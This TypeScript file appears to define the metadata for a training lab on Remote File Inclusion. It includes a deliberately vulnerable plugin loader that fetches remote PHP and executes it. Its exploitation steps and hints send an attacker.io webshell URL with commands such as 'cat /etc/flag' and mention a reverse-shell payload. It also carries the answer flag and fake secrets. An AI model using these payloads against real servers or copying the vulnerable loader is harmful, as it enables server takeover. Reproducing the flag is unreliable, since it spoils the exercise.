// src/modules/practice-labs/file-inclusion/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab4Metadata: LabMetadata = {
  slug: 'rfi-remote-file-inclusion-plugin-manager',
  title: 'File Inclusion: RFI — Remote Plugin Manager (allow_url_include)',
  ar_title: 'تضمين الملفات: RFI — مدير الإضافات عن بُعد (allow_url_include)',
  description:
    'Exploit a Remote File Inclusion vulnerability in a CMS plugin manager where allow_url_include is enabled. Load a remotely hosted malicious PHP file via HTTP URL to execute arbitrary code on the server — simulating a real-world RFI attack chain from file inclusion to full server takeover.',
  ar_description:
    'استغل ثغرة RFI في مدير إضافات CMS حيث allow_url_include مُفعَّل. حمّل ملف PHP خبيث مستضاف عن بُعد عبر HTTP URL لتنفيذ كود عشوائي على الخادم — محاكاة سلسلة هجوم RFI حقيقية من تضمين الملف إلى الاستيلاء الكامل على الخادم.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Remote File Inclusion',
    'RFI',
    'allow_url_include',
    'Remote Code Execution',
    'Plugin Security',
  ],
  xpReward: 360,
  pointsReward: 180,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  goal: 'The plugin manager loads plugins via URL. Host a "malicious" PHP payload at the simulated attacker server (/attacker/payloads), then include it via the plugin URL parameter to execute code and read /etc/flag on the server.',
  scenario: {
    context:
      'PluginHub CMS allows admins to install plugins by URL. The backend executes: include($_GET["plugin_url"]). With allow_url_include=On in php.ini, PHP will fetch and execute remote PHP files. An attacker can host malicious PHP at their own server and pass its URL as the plugin_url parameter — achieving full RCE without any file upload.',
    vulnerableCode: `// Plugin loader (vulnerable — RFI):
app.get('/plugins/install', isAuthenticated, async (req, res) => {
  const { plugin_url } = req.query;
  // ❌ allow_url_include = On
  // ❌ Fetches and executes remote PHP file!
  const content = await httpFetch(plugin_url);
  executePhp(content); // Full RCE!
  res.json({ installed: true });
});`,
    exploitation:
      '1. GET /attacker/payloads to see available malicious payloads\n2. POST /plugins/install with { "pluginUrl": "http://attacker.io/shell.php" }\n3. The server fetches and executes the remote PHP file\n4. RCE achieved — read /etc/flag',
  },
  hints: [
    {
      order: 1,
      xpCost: 25,
      content:
        'The plugin installer accepts a URL. What if the URL points to YOUR server? With allow_url_include=On, PHP fetches and EXECUTES remote files.',
    },
    {
      order: 2,
      xpCost: 45,
      content:
        'GET /attacker/payloads to see the list of malicious PHP files available on the simulated attacker server. Pick one that executes system commands.',
    },
    {
      order: 3,
      xpCost: 70,
      content:
        'POST /plugins/install with { "pluginUrl": "http://attacker.io/webshell.php?cmd=whoami" }. The server will fetch the remote PHP, execute it, and return the output.',
    },
    {
      order: 4,
      xpCost: 100,
      content:
        'Use the webshell payload with cmd=cat /etc/flag to read the flag. Or use the reverse_shell payload for a full simulated shell session.',
    },
  ],
  flagAnswer: 'FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
  initialState: {
    contents: [
      {
        title: 'ETC_FLAG',
        body: 'CMS_DB_ROOT_PASS=C0rp_DB_R00t_2024!\nADMIN_API_TOKEN=tok_live_pluginhub_secret_xyz\nFLAG=FLAG{RFI_REMOTE_FILE_INCLUSION_PLUGIN_WEBSHELL_RCE}',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
